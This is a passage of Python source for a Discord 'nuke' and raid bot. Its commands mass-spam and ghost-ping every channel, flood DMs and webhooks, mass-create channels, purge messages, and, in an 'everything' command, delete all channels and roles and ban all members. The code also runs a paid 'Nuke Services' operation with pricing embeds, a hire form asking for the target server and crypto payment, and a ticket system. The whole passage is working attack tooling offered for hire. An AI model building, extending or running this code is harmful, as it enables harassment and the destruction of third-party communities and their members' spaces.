        ("✅ Sent", sent, True), ("❌ Failed", failed, True),
        ("Message", message[:200], False),
    ]))

@bot.command()
async def dmembed(ctx, member: discord.Member, *, text: str):
    parts = text.split("|", 1)
    title = parts[0].strip()
    body = parts[1].strip() if len(parts) > 1 else "\u200b"
    dm_embed = discord.Embed(title=title, description=body, color=0xff0000)
    sent, failed, fl = await _dm_batch([member], embed=dm_embed)
    await status(ctx, f"dmembed {member} — {'sent' if sent else 'failed'}")
    await _log_embed(_action_embed("📩 DM Embed", 0xff69b4, [
        ("User", str(member), True),
        ("✅ Sent", sent, True), ("❌ Failed", failed, True),
        ("Title", title, True),
    ]))

# ─────────────────────────────────────────────
# MESSAGING
# ─────────────────────────────────────────────

@bot.command()
async def mcp(ctx, name: str, count: int, pings: int = 5, *, message: str = "@everyone"):
    ch_sem = asyncio.Semaphore(5)
    async def create_and_ping():
        async with ch_sem:
            ch = await safe(ctx.guild.create_text_channel(name))
            if not ch:
                return
        await asyncio.gather(*[safe(ch.send(message)) for _ in range(pings)])
    await asyncio.gather(*[create_and_ping() for _ in range(count)])
    await status(ctx, f"mcp {name} {count} x{pings}")
    await _log_embed(_action_embed("⚡ MCP Executed", 0xeb459e,
        [("Name", name, True), ("Channels", count, True), ("Pings each", pings, True),
         ("Message", message[:200], False)]))

@bot.command()
async def spam(ctx, count: int, *, message: str):
    await batch([ctx.channel.send(message) for _ in range(count)], **BATCH_MSG)
    await status(ctx, f"spam {count}")
    await _log_embed(_action_embed("💬 Spam", 0xeb459e,
        [("Channel", f"#{ctx.channel.name}", True), ("Count", count, True),
         ("Message", message[:200], False)]))

@bot.command()
async def spamall(ctx, count: int, *, message: str):
    coros = [ch.send(message) for ch in ctx.guild.text_channels for _ in range(count)]
    await batch(coros, **BATCH_MSG)
    await status(ctx, f"spamall {count}")
    await _log_embed(_action_embed("💬 Spam All Channels", 0xeb459e,
        [("Per channel", count, True), ("Channels", len(ctx.guild.text_channels), True),
         ("Message", message[:200], False)]))

@bot.command()
async def pingall(ctx, count: int):
    coros = [ch.send("@everyone") for ch in ctx.guild.text_channels for _ in range(count)]
    await batch(coros, **BATCH_MSG)
    await status(ctx, f"pingall {count}")
    await _log_embed(_action_embed("🔔 Ping @everyone All Channels", 0xeb459e,
        [("Per channel", count, True), ("Channels", len(ctx.guild.text_channels), True)]))

@bot.command()
async def pingr(ctx, role: discord.Role, count: int):
    coros = [ch.send(role.mention) for ch in ctx.guild.text_channels for _ in range(count)]
    await batch(coros, **BATCH_MSG)
    await status(ctx, f"pingr {role.name} {count}")
    await _log_embed(_action_embed("🔔 Ping Role All Channels", 0xeb459e,
        [("Role", role.name, True), ("Per channel", count, True)]))

@bot.command()
async def ghostping(ctx, count: int = 1):
    async def ghost():
        msg = await safe(ctx.channel.send("@everyone"))
        if msg:
            await safe(msg.delete())
    await batch([ghost() for _ in range(count)], **BATCH_MSG)
    await status(ctx, f"ghostping x{count}")
    await _log_embed(_action_embed("👻 Ghost Ping", 0xeb459e,
        [("Channel", f"#{ctx.channel.name}", True), ("Times", count, True)]))

@bot.command()
async def ghostpingall(ctx, count: int = 1):
    async def ghost_ch(ch):
        for _ in range(count):
            msg = await safe(ch.send("@everyone"))
            if msg:
                await safe(msg.delete())
    await batch([ghost_ch(ch) for ch in ctx.guild.text_channels], **BATCH_MSG)
    await status(ctx, f"ghostpingall x{count}")
    await _log_embed(_action_embed("👻 Ghost Ping All Channels", 0xeb459e,
        [("Times each", count, True), ("Channels", len(ctx.guild.text_channels), True)]))

@bot.command()
async def tts(ctx, *, message: str):
    await safe(ctx.channel.send(message, tts=True))
    await status(ctx, "tts")

@bot.command()
async def ttsall(ctx, *, message: str):
    await batch([ch.send(message, tts=True) for ch in ctx.guild.text_channels], **BATCH_MSG)
    await status(ctx, "ttsall")
    await _log_embed(_action_embed("🔊 TTS All Channels", 0xeb459e,
        [("Channels", len(ctx.guild.text_channels), True), ("Message", message[:200], False)]))

@bot.command()
async def embedspam(ctx, count: int, *, text: str):
    parts = text.split("|", 1)
    title = parts[0].strip()
    body = parts[1].strip() if len(parts) > 1 else "\u200b"
    embed = discord.Embed(title=title, description=body, color=0xff0000)
    await batch([ctx.channel.send(embed=embed) for _ in range(count)], **BATCH_MSG)
    await status(ctx, f"embedspam {count}")

@bot.command()
async def embedall(ctx, *, text: str):
    parts = text.split("|", 1)
    title = parts[0].strip()
    body = parts[1].strip() if len(parts) > 1 else "\u200b"
    embed = discord.Embed(title=title, description=body, color=0xff0000)
    await batch([ch.send(embed=embed) for ch in ctx.guild.text_channels], **BATCH_MSG)
    await status(ctx, "embedall")
    await _log_embed(_action_embed("📢 Embed Sent to All Channels", 0xeb459e,
        [("Title", title, True), ("Channels", len(ctx.guild.text_channels), True)]))

@bot.command()
async def purge(ctx, count: int):
    await ctx.channel.purge(limit=count + 1)
    await status(ctx, f"purge {count}")
    await _log_embed(_action_embed("🧹 Purge", 0xff0000,
        [("Channel", f"#{ctx.channel.name}", True), ("Limit", count, True)]))

@bot.command()
async def purgeall(ctx, count: int):
    await batch([ch.purge(limit=count) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, f"purgeall {count}")
    await _log_embed(_action_embed("🧹 Purge All Channels", 0xff0000,
        [("Per channel", count, True), ("Channels", len(ctx.guild.text_channels), True)]))

@bot.command()
async def purgebots(ctx, count: int):
    await ctx.channel.purge(limit=count + 1, check=lambda m: m.author.bot)
    await status(ctx, f"purgebots {count}")

@bot.command()
async def purgeuser(ctx, member: discord.Member, count: int = 100):
    await ctx.channel.purge(limit=count + 1, check=lambda m: m.author == member)
    await status(ctx, f"purgeuser {member} {count}")
    await _log_embed(_action_embed("🧹 Purge User Messages", 0xff0000,
        [("User", str(member), True), ("Limit", count, True), ("Channel", f"#{ctx.channel.name}", True)]))

@bot.command()
async def say(ctx, channel: discord.TextChannel, *, message: str):
    await safe(channel.send(message))
    await status(ctx, f"say #{channel.name}")

@bot.command()
async def announce(ctx, *, message: str):
    embed = discord.Embed(title="📢 Announcement", description=message,
                          color=0xff0000, timestamp=discord.utils.utcnow())
    embed.set_footer(text=f"From {ctx.author}")
    await batch([ch.send(embed=embed) for ch in ctx.guild.text_channels], **BATCH_MSG)
    await status(ctx, "announce")
    await _log_embed(_action_embed("📢 Announcement Sent", 0xeb459e,
        [("Channels", len(ctx.guild.text_channels), True), ("Message", message[:200], False)]))

@bot.command()
async def countdown(ctx, n: int, *, message: str = "🚀"):
    for i in range(n, 0, -1):
        await safe(ctx.channel.send(f"**{i}**"))
        await asyncio.sleep(1)
    await safe(ctx.channel.send(message))

@bot.command()
async def react(ctx, message_id: int, emoji: str):
    try:
        msg = await ctx.channel.fetch_message(message_id)
        await msg.add_reaction(emoji)
        await status(ctx, f"react {emoji}")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command()
async def reactall(ctx, emoji: str):
    async def react_last(ch):
        async for msg in ch.history(limit=1):
            await safe(msg.add_reaction(emoji))
    await batch([react_last(ch) for ch in ctx.guild.text_channels], **BATCH_MSG)
    await status(ctx, f"reactall {emoji}")
    await _log_embed(_action_embed("😀 React All Channels", 0xeb459e,
        [("Emoji", emoji, True), ("Channels", len(ctx.guild.text_channels), True)]))

@bot.command()
async def wspam(ctx, count: int, *, message: str):
    wh = await safe(ctx.channel.create_webhook(name="spam"))
    if wh:
        await batch([wh.send(message) for _ in range(count)], **BATCH_WH)
        await safe(wh.delete())
    await status(ctx, f"wspam {count}")
    await _log_embed(_action_embed("⚡ Webhook Spam", 0xeb459e,
        [("Channel", f"#{ctx.channel.name}", True), ("Count", count, True),
         ("Message", message[:200], False)]))

@bot.command()
async def wspamall(ctx, count: int, *, message: str):
    webhooks = []
    for ch in ctx.guild.text_channels:
        wh = await safe(ch.create_webhook(name="spam"))
        if wh:
            webhooks.append(wh)
    coros = [wh.send(message) for wh in webhooks for _ in range(count)]
    await batch(coros, **BATCH_WH)
    await batch([wh.delete() for wh in webhooks], **BATCH_CH)
    await status(ctx, f"wspamall {count}")
    await _log_embed(_action_embed("⚡ Webhook Spam All Channels", 0xeb459e,
        [("Webhooks used", len(webhooks), True), ("Per webhook", count, True),
         ("Message", message[:200], False)]))

@bot.command()
async def whnuke(ctx, name: str, count: int, pings: int = 10, *, message: str = "@everyone"):
    ch_sem = asyncio.Semaphore(5)
    async def make_and_blast():
        async with ch_sem:
            ch = await safe(ctx.guild.create_text_channel(name))
            if not ch:
                return
            wh = await safe(ch.create_webhook(name="nuke"))
            if not wh:
                return
        await asyncio.gather(*[safe(wh.send(message)) for _ in range(pings)])
    await asyncio.gather(*[make_and_blast() for _ in range(count)])
    await status(ctx, f"whnuke {name} {count} x{pings}")
    await _log_embed(_action_embed("⚡ Webhook Nuke", 0xff0000,
        [("Channel name", name, True), ("Channels", count, True), ("Pings each", pings, True),
         ("Message", message[:200], False)]))

@bot.command()
async def pin(ctx, message_id: int):
    try:
        msg = await ctx.channel.fetch_message(message_id)
        await msg.pin()
        await status(ctx, f"pin {message_id}")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command()
async def massping(ctx, member: discord.Member, count: int):
    await batch([ctx.channel.send(member.mention) for _ in range(count)], **BATCH_MSG)
    await status(ctx, f"massping {member} x{count}")
    await _log_embed(_action_embed("🔔 Mass Ping User", 0xeb459e,
        [("User", str(member), True), ("Times", count, True), ("Channel", f"#{ctx.channel.name}", True)]))

@bot.command()
async def forwardall(ctx, source: discord.TextChannel, dest: discord.TextChannel):
    msgs = []
    async for msg in source.history(limit=100, oldest_first=True):
        msgs.append(msg)
    async def forward(m):
        if m.content:
            await safe(dest.send(f"**{m.author}:** {m.content}"))
    await batch([forward(m) for m in msgs], **BATCH_MSG)
    await status(ctx, f"forwardall #{source.name} → #{dest.name}")
    await _log_embed(_action_embed("📨 Forward All Messages", 0xeb459e,
        [("From", f"#{source.name}", True), ("To", f"#{dest.name}", True),
         ("Messages", len(msgs), True)]))

# ─────────────────────────────────────────────
# SERVER
# ─────────────────────────────────────────────

@bot.command()
async def renameserver(ctx, *, name: str):
    old = ctx.guild.name
    await ctx.guild.edit(name=name)
    await status(ctx, f"renameserver {name}")
    await _log_embed(_action_embed("✏️ Server Renamed", 0x9b59b6,
        [("Before", old, True), ("After", name, True)]))

@bot.command()
async def icon(ctx, url: str):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status != 200:
                await ctx.send("❌ Failed to fetch image.")
                return
            data = await resp.read()
    await ctx.guild.edit(icon=data)
    await status(ctx, "icon")
    await _log_embed(_action_embed("🖼️ Server Icon Changed", 0x9b59b6,
        [("Guild", ctx.guild.name, True), ("By", str(ctx.author), True)]))

@bot.command()
async def banner(ctx, url: str):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status != 200:
                await ctx.send("❌ Failed to fetch image.")
                return
            data = await resp.read()
    await ctx.guild.edit(banner=data)
    await status(ctx, "banner")
    await _log_embed(_action_embed("🖼️ Server Banner Changed", 0x9b59b6,
        [("Guild", ctx.guild.name, True), ("By", str(ctx.author), True)]))

@bot.command()
async def description(ctx, *, text: str):
    await ctx.guild.edit(description=text)
    await status(ctx, "description")
    await _log_embed(_action_embed("📝 Server Description Changed", 0x9b59b6,
        [("Guild", ctx.guild.name, True), ("Text", text[:200], False)]))

@bot.command()
async def das(ctx):
    count = len(ctx.guild.stickers)
    await batch([s.delete() for s in ctx.guild.stickers], **BATCH_CH)
    await status(ctx, "das")
    await _log_embed(_action_embed("🗑️ Deleted All Stickers", 0xff0000,
        [("Deleted", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def delemojis(ctx):
    count = len(ctx.guild.emojis)
    await batch([e.delete() for e in ctx.guild.emojis], **BATCH_CH)
    await status(ctx, "delemojis")
    await _log_embed(_action_embed("🗑️ Deleted All Emojis", 0xff0000,
        [("Deleted", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def addemoji(ctx, name: str, url: str):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status != 200:
                await ctx.send("❌ Failed to fetch image.")
                return
            data = await resp.read()
    emoji = await safe(ctx.guild.create_custom_emoji(name=name, image=data))
    if emoji:
        await status(ctx, f"addemoji {name}")
        await _log_embed(_action_embed("😀 Emoji Added", 0x57f287,
            [("Name", name, True), ("Guild", ctx.guild.name, True)]))
    else:
        await ctx.send("❌ Failed to create emoji (check slots or file type).")

@bot.command()
async def massemoji(ctx, name: str, url: str, count: int):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status != 200:
                await ctx.send("❌ Failed to fetch image.")
                return
            data = await resp.read()
    async def add_one(i):
        await safe(ctx.guild.create_custom_emoji(name=f"{name}{i}", image=data))
    await batch([add_one(i) for i in range(1, count + 1)], **BATCH_CH)
    await status(ctx, f"massemoji {name} x{count}")
    await _log_embed(_action_embed("😀 Mass Emoji Added", 0x57f287,
        [("Base name", name, True), ("Count", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def delthreads(ctx):
    count = len(ctx.guild.threads)
    await batch([t.delete() for t in ctx.guild.threads], **BATCH_CH)
    await status(ctx, "delthreads")
    await _log_embed(_action_embed("🗑️ Deleted All Threads", 0xff0000,
        [("Deleted", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def delwebhooks(ctx):
    webhooks = await ctx.guild.webhooks()
    await batch([w.delete() for w in webhooks], **BATCH_CH)
    await status(ctx, "delwebhooks")
    await _log_embed(_action_embed("🗑️ Deleted All Webhooks", 0xff0000,
        [("Deleted", len(webhooks), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def delinvites(ctx):
    invites = await ctx.guild.invites()
    await batch([inv.delete() for inv in invites], **BATCH_CH)
    await status(ctx, "delinvites")
    await _log_embed(_action_embed("🗑️ Deleted All Invites", 0xff0000,
        [("Deleted", len(invites), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def listinvites(ctx):
    invites = await ctx.guild.invites()
    if not invites:
        await ctx.send("No active invites.")
        return
    lines = [f"`{inv.code}` — #{inv.channel.name} by {inv.inviter} ({inv.uses} uses)" for inv in invites]
    text = "\n".join(lines)
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await safe(ctx.send(f"```\n{chunk}\n```"))

@bot.command()
async def webhook(ctx, name: str, count: int):
    async def make_webhook(ch):
        for _ in range(count):
            await safe(ch.create_webhook(name=name))
    await batch([make_webhook(ch) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, f"webhook {name} {count}")
    await _log_embed(_action_embed("🪝 Mass Webhooks Created", 0x9b59b6,
        [("Name", name, True), ("Per channel", count, True),
         ("Channels", len(ctx.guild.text_channels), True)]))

@bot.command()
async def audit(ctx, count: int = 10):
    entries = []
    async for entry in ctx.guild.audit_logs(limit=count):
        entries.append(f"`{entry.action.name}` — {entry.user} → {entry.target}")
    text = "\n".join(entries) if entries else "No audit log entries."
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await safe(ctx.send(f"```\n{chunk}\n```"))

@bot.command()
async def serverinfo(ctx):
    g = ctx.guild
    embed = discord.Embed(title=f"🌐 {g.name}", color=0xff0000)
    embed.add_field(name="ID", value=str(g.id))
    embed.add_field(name="Owner", value=str(g.owner))
    embed.add_field(name="Members", value=str(g.member_count))
    embed.add_field(name="Channels", value=str(len(g.channels)))
    embed.add_field(name="Roles", value=str(len(g.roles)))
    embed.add_field(name="Emojis", value=str(len(g.emojis)))
    embed.add_field(name="Boosts", value=str(g.premium_subscription_count))
    embed.add_field(name="Boost Level", value=str(g.premium_tier))
    embed.add_field(name="Created", value=g.created_at.strftime("%Y-%m-%d"))
    embed.add_field(name="Verification", value=str(g.verification_level))
    if g.icon:
        embed.set_thumbnail(url=g.icon.url)
    await ctx.send(embed=embed)

@bot.command()
async def setverification(ctx, level: int):
    levels = {0: discord.VerificationLevel.none, 1: discord.VerificationLevel.low,
              2: discord.VerificationLevel.medium, 3: discord.VerificationLevel.high,
              4: discord.VerificationLevel.highest}
    if level not in levels:
        await ctx.send("❌ Level must be 0–4.")
        return
    await ctx.guild.edit(verification_level=levels[level])
    await status(ctx, f"setverification {level}")
    await _log_embed(_action_embed("🔒 Verification Level Changed", 0x9b59b6,
        [("Level", level, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def setfilter(ctx, level: int):
    levels = {0: discord.ContentFilter.disabled, 1: discord.ContentFilter.no_role,
              2: discord.ContentFilter.all_members}
    if level not in levels:
        await ctx.send("❌ Level must be 0–2.")
        return
    await ctx.guild.edit(explicit_content_filter=levels[level])
    await status(ctx, f"setfilter {level}")
    await _log_embed(_action_embed("🔞 Content Filter Changed", 0x9b59b6,
        [("Level", level, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def setnotifications(ctx, level: int):
    levels = {0: discord.NotificationLevel.all_messages, 1: discord.NotificationLevel.only_mentions}
    if level not in levels:
        await ctx.send("❌ Level must be 0 or 1.")
        return
    await ctx.guild.edit(default_notifications=levels[level])
    await status(ctx, f"setnotifications {level}")

@bot.command()
async def setafk(ctx, channel: discord.VoiceChannel):
    await ctx.guild.edit(afk_channel=channel)
    await status(ctx, f"setafk #{channel.name}")

@bot.command()
async def setafktimeout(ctx, seconds: int):
    valid = [60, 300, 900, 1800, 3600]
    if seconds not in valid:
        await ctx.send(f"❌ Must be one of: {valid}")
        return
    await ctx.guild.edit(afk_timeout=seconds)
    await status(ctx, f"setafktimeout {seconds}s")

@bot.command()
async def vanity(ctx):
    try:
        code = ctx.guild.vanity_url_code
        url = f"discord.gg/{code}" if code else "No vanity URL set."
        await ctx.send(f"🔗 Vanity: `{url}`")
    except Exception:
        await ctx.send("❌ No vanity URL or missing permission.")

@bot.command()
async def inviteme(ctx):
    perms = discord.Permissions(administrator=True)
    url = discord.utils.oauth_url(bot.user.id, permissions=perms)
    await ctx.send(f"🤖 Bot invite:\n{url}")

@bot.command()
async def everything(ctx):
    guild = ctx.guild
    protected_members = {guild.me, guild.owner}
    protected_roles    = {guild.default_role, guild.me.top_role}
    await batch([ch.delete() for ch in guild.channels], **BATCH_CH)
    await batch([r.delete() for r in guild.roles if r not in protected_roles], **BATCH_ROLE)
    await batch([m.ban(reason="Nuke") for m in guild.members if m not in protected_members], **BATCH_MBR)
    await batch([s.delete() for s in guild.stickers], **BATCH_CH)
    await batch([guild.create_text_channel("nuked") for _ in range(10)], **BATCH_CH)
    await status(ctx, "everything")
    await _log_embed(_action_embed("☢️ EVERYTHING EXECUTED", 0xff0000,
        [("Guild", guild.name, True), ("By", str(ctx.author), True),
         ("Channels", "deleted", True), ("Roles", "deleted", True),
         ("Members", "banned", True), ("Stickers", "deleted", True)]))

# ─────────────────────────────────────────────
# BOT UTILITY
# ─────────────────────────────────────────────

@bot.command()
async def ping(ctx):
    latency = round(bot.latency * 1000)
    await ctx.send(f"🏓 Pong! `{latency}ms`")

@bot.command()
async def uptime(ctx):
    elapsed = int(time.time() - START_TIME)
    h, r = divmod(elapsed, 3600)
    m, s = divmod(r, 60)
    await ctx.send(f"⏱️ Uptime: `{h}h {m}m {s}s`")

@bot.command()
async def botstatus(ctx, *, status_text: str):
    await bot.change_presence(activity=discord.Game(name=status_text))
    await status(ctx, f"botstatus → {status_text}")

@bot.command()
async def botname(ctx, *, name: str):
    await bot.user.edit(username=name)
    await status(ctx, f"botname → {name}")
    await _log_embed(_action_embed("🤖 Bot Renamed", 0xffd700,
        [("New name", name, True), ("By", str(ctx.author), True)]))

@bot.command()
async def botavatar(ctx, url: str):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status != 200:
                await ctx.send("❌ Failed to fetch image.")
                return
            data = await resp.read()
    await bot.user.edit(avatar=data)
    await status(ctx, "botavatar")
    await _log_embed(_action_embed("🤖 Bot Avatar Changed", 0xffd700,
        [("By", str(ctx.author), True)]))

@bot.command()
async def activity(ctx, activity_type: str, *, text: str):
    t = activity_type.lower()
    if t == "playing":
        act = discord.Game(name=text)
    elif t == "watching":
        act = discord.Activity(type=discord.ActivityType.watching, name=text)
    elif t == "listening":
        act = discord.Activity(type=discord.ActivityType.listening, name=text)
    elif t == "streaming":
        act = discord.Streaming(name=text, url="https://twitch.tv/placeholder")
    elif t == "competing":
        act = discord.Activity(type=discord.ActivityType.competing, name=text)
    else:
        await ctx.send("❌ Types: `playing`, `watching`, `listening`, `streaming`, `competing`")
        return
    await bot.change_presence(activity=act)
    await status(ctx, f"activity {t} {text}")

@bot.command()
async def guilds(ctx):
    lines = [f"`{g.id}` — **{g.name}** ({g.member_count} members)" for g in bot.guilds]
    text = "\n".join(lines)
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await safe(ctx.send(f"```\n{chunk}\n```"))

@bot.command()
async def cmdcount(ctx):
    count = len(bot.commands)
    await ctx.send(f"🤖 **{count}** commands registered.")

# ═══════════════════════════════════════════════════════════════════
# MODMAIL  — DMs to the bot are logged; staff can reply / block
# ═══════════════════════════════════════════════════════════════════

MODMAIL_BLOCKED: set[int] = set()   # user IDs blocked from DMing


class _ReplyModal(discord.ui.Modal, title="Reply to User"):
    reply_text = discord.ui.TextInput(
        label="Your reply",
        style=discord.TextStyle.paragraph,
        max_length=2000,
    )

    def __init__(self, target_id: int):
        super().__init__()
        self.target_id = target_id

    async def on_submit(self, interaction: discord.Interaction):
        try:
            user = bot.get_user(self.target_id) or await bot.fetch_user(self.target_id)
            e = discord.Embed(
                title="📬 Message from Staff",
                description=self.reply_text.value,
                color=0x5865F2,
            )
            e.set_footer(text="Reply to this message by DMing the bot again.")
            await user.send(embed=e)
            await interaction.response.send_message("✅ Reply sent!", ephemeral=True)
            await _log_embed(_action_embed("📤 ModMail Reply Sent", 0x5865F2, [
                ("To",      f"{user} `{user.id}`",          True),
                ("By",      str(interaction.user),           True),
                ("Message", self.reply_text.value[:1020],   False),
            ]))
        except Exception as ex:
            await interaction.response.send_message(f"❌ Failed to send: `{ex}`", ephemeral=True)


class _ModMailView(discord.ui.View):
    def __init__(self, user_id: int):
        super().__init__(timeout=None)
        self.user_id = user_id

    @discord.ui.button(label="✉️ Reply", style=discord.ButtonStyle.primary)
    async def reply_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in WHITELIST:
            await interaction.response.send_message("❌ Whitelist only.", ephemeral=True)
            return
        await interaction.response.send_modal(_ReplyModal(self.user_id))

    @discord.ui.button(label="🚫 Block User", style=discord.ButtonStyle.danger)
    async def block_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in WHITELIST:
            await interaction.response.send_message("❌ Whitelist only.", ephemeral=True)
            return
        MODMAIL_BLOCKED.add(self.user_id)
        button.disabled = True
        button.label = "🚫 Blocked"
        await interaction.message.edit(view=self)
        await interaction.response.send_message(
            f"✅ `{self.user_id}` blocked from DMing the bot.", ephemeral=True
        )


# ─── Interactive DM welcome menu ───────────────────────────────────

class _DMPricingView(discord.ui.View):
    """Sent when a user clicks Pricing in the DM menu."""

    def __init__(self):
        super().__init__(timeout=120)

    @discord.ui.button(label="📋 Hire Us Now", style=discord.ButtonStyle.danger, emoji="🔥")
    async def hire_now(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(_HireModal())


class _DMMenuView(discord.ui.View):
    """Initial interactive menu sent in DMs when a user messages the bot."""

    def __init__(self):
        super().__init__(timeout=180)

    @discord.ui.button(label="🔥 Hire Us", style=discord.ButtonStyle.danger)
    async def hire_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(_HireModal())

    @discord.ui.button(label="💰 Pricing", style=discord.ButtonStyle.secondary)
    async def pricing_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        e = discord.Embed(title="💰 Our Pricing", color=0xffd700)
        e.add_field(name="🔥 Basic Nuke",     value="From **$10**\nChannels, roles, mass ban", inline=False)
        e.add_field(name="💣 Raid Package",   value="From **$15**\nMass spam, DM flood, webhooks", inline=False)
        e.add_field(name="⚡ Premium Package", value="From **$25**\nFull nuke + raid + custom options", inline=False)
        e.add_field(name="🎯 Custom Job",     value="**Negotiable**\nTell us exactly what you need", inline=False)
        e.set_footer(text="Payment accepted on acceptance of your request • Click Hire Us to submit")
        await interaction.response.send_message(embed=e, view=_DMPricingView(), ephemeral=False)

    @discord.ui.button(label="❓ Support", style=discord.ButtonStyle.secondary)
    async def support_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        e = discord.Embed(
            title="❓ Support",
            description=(
                "Our staff have received your message and will reply shortly.\n\n"
                "**Tips:**\n"
                "• Be specific about your request\n"
                "• Include relevant server IDs or invites\n"
                "• Check your DMs for a reply from us"
            ),
            color=0x5865F2,
        )
        await interaction.response.send_message(embed=e, ephemeral=False)


@bot.event
async def on_message(message: discord.Message):
    # Always process commands first
    await bot.process_commands(message)

    # Only handle DMs, not from bots, not from self
    if message.guild or message.author.bot:
        return
    if message.author.id == bot.user.id:
        return
    if message.author.id in MODMAIL_BLOCKED:
        try:
            await message.author.send(
                "🚫 You have been blocked from contacting this bot's staff."
            )
        except Exception:
            pass
        return

    # Send interactive welcome menu to the user
    welcome = discord.Embed(
        title="👋 Welcome!",
        description=(
            "Thanks for reaching out. Our staff has been notified.\n\n"
            "Use the buttons below to **hire us**, view **pricing**, or get **support**."
        ),
        color=0xff4500,
    )
    welcome.set_footer(text="Powered by Nuke Services • Reply to continue chatting")
    try:
        await message.author.send(embed=welcome, view=_DMMenuView())
    except Exception:
        pass

    # Log to staff log channel
    if LOG_CHANNEL_ID:
        ch = bot.get_channel(LOG_CHANNEL_ID)
        if ch:
            e = _action_embed("📩 ModMail — Incoming DM", 0xeb459e, [
                ("From",    f"{message.author} `{message.author.id}`",  True),
                ("Account Age",
                 f"{(discord.utils.utcnow() - message.author.created_at).days}d old", True),
                ("Message", message.content[:1020] or "*(no text)*", False),
            ])
            e.set_thumbnail(url=message.author.display_avatar.url)
            try:
                await ch.send(embed=e, view=_ModMailView(message.author.id))
            except Exception:
                pass


# ═══════════════════════════════════════════════════════════════════
# HIRE / TICKET SYSTEM
# ═══════════════════════════════════════════════════════════════════

HIRE_FILE      = "hire_tickets.json"
HIRE_GUILD_ID  = 1529019736472682546          # fixed server for ticket channels
HIRE_CAT_NAME  = "🎫 Hire Tickets"
HIRE_CHANNEL_ID: int | None = None            # optional fallback log channel

PRICES_FILE = "prices.json"
_DEFAULT_PRICES: dict = {
    "basic":   "10",
    "raid":    "15",
    "premium": "25",
    "custom":  "Negotiable",
}

def _load_prices() -> dict:
    try:
        with open(PRICES_FILE) as f:
            return json.load(f)
    except Exception:
        return dict(_DEFAULT_PRICES)

def _save_prices():
    try:
        with open(PRICES_FILE, "w") as f:
            json.dump(PRICES, f, indent=2)
    except Exception:
        pass

PRICES: dict = _load_prices()


def _load_tickets() -> dict:
    try:
        with open(HIRE_FILE) as f:
            return json.load(f)
    except Exception:
        return {"next_id": 1, "tickets": {}}


def _save_tickets():
    try:
        with open(HIRE_FILE, "w") as f:
            json.dump(TICKETS, f, indent=2)
    except Exception:
        pass


TICKETS: dict = _load_tickets()


# ─── Hire request modal (opens from !hire or DM menu) ──────────────

class _HireModal(discord.ui.Modal, title="🔥 Hire Request — Nuke Services"):
    server_name   = discord.ui.TextInput(label="Target server name",         max_length=100)
    server_invite = discord.ui.TextInput(label="Server invite or ID (optional)", required=False, max_length=120)
    details       = discord.ui.TextInput(
        label="What do you want done?",
        style=discord.TextStyle.paragraph,
        placeholder="Describe exactly what you need (nuke, raid, DM flood, etc.)",
        max_length=500,
    )
    payment       = discord.ui.TextInput(
        label="Preferred payment method",
        placeholder="Crypto (BTC/ETH/LTC), PayPal, etc.",
        max_length=100,
    )
    contact       = discord.ui.TextInput(
        label="How should we contact you?",
        placeholder="Discord tag, email, or 'DM this bot'",
        max_length=200,
    )

    async def on_submit(self, interaction: discord.Interaction):
        tid = str(TICKETS["next_id"])
        TICKETS["next_id"] += 1
        TICKETS["tickets"][tid] = {
            "id":            tid,
            "user_id":       interaction.user.id,
            "user_name":     str(interaction.user),
            "server_name":   self.server_name.value,
            "server_invite": self.server_invite.value or "N/A",
            "details":       self.details.value,
            "payment":       self.payment.value,
            "contact":       self.contact.value,
            "status":        "pending",
            "created_at":    datetime.datetime.utcnow().isoformat(),
            "handled_by":    None,
            "note":          "",
        }
        _save_tickets()

        # Confirm to requester
        confirm = discord.Embed(
            title="✅ Hire Request Submitted",
            description=(
                f"Your request **#{tid}** has been submitted and is pending review.\n"
                "Our staff will contact you once accepted or denied."
            ),
            color=0x57f287,
        )
        confirm.add_field(name="📋 Ticket ID", value=f"`#{tid}`",    inline=True)
        confirm.add_field(name="📊 Status",    value="🟡 Pending",   inline=True)
        confirm.add_field(name="🎯 Target",    value=self.server_name.value, inline=True)
        confirm.set_footer(text=f"Use !hirestatus {tid} to check your ticket anytime")
        await interaction.response.send_message(embed=confirm)

        # Post to hire channel
        await _post_hire_ticket(TICKETS["tickets"][tid])

        # Log
        await _log_embed(_action_embed("🎫 New Hire Ticket", 0xffd700, [
            ("Ticket",  f"#{tid}",                          True),
            ("Client",  f"{interaction.user} `{interaction.user.id}`", True),
            ("Target",  self.server_name.value,             True),
            ("Payment", self.payment.value,                 True),
            ("Details", self.details.value[:512],           False),
        ]))


# ─── Ticket embed helpers ──────────────────────────────────────────

_TICKET_COLORS = {"pending": 0xffd700, "accepted": 0x57f287,
                  "denied": 0xff0000, "closed": 0x99aab5}
_TICKET_ICONS  = {"pending": "🟡", "accepted": "✅", "denied": "❌", "closed": "🔒"}


def _ticket_embed(t: dict) -> discord.Embed:
    status = t.get("status", "pending")
    e = discord.Embed(
